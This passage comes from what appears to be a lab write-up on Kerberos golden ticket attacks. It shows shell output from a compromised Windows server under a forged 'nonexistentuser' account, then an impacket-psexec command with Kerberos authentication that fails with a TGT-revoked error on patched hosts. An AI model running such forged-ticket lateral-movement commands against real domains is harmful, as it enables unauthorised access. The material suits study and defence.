(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\nonexistentuser

C:\Windows\system32>hostname
SVR

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.12
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```

### 5.3. Golden Ticket Fixed?

Access denied and TGT revoked errors were seen when performing golden ticket attacks on newer updated Windows boxes

```console
root@kali:~# impacket-psexec lab.vx/nonexistentuser@192.168.17.11 -k -no-pass -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
```

Read:

<https://github.com/SecureAuthCorp/impacket/issues/1390>

<https://www.varonis.com/blog/pac_requestor-and-golden-ticket-attacks>
